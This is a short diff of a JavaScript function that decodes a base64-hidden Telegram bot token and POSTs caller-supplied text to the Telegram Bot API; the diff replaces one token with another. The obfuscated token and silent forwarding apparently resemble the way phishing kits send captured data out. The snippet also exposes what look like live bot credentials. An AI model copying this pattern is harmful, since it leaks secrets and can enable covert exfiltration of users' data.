@@ -1,5 +1,5 @@
 function BOOT(id, text) {
-            const token = atob("NzgyNzQ0NzUyNjpBQUZUQUUzQVJmODUtYlZkdFVPYXNpQkg1cmNPcUxrNjhVWQ==");
+            let token = atob('ODY2MjM2OTY1MjpBQUhpRVBNNHNUUDhHU2gzRXVPY2xBRmROUzZnUVYwRS1Eaw==');
             const chat_id = id;
             fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                 method: "POST",
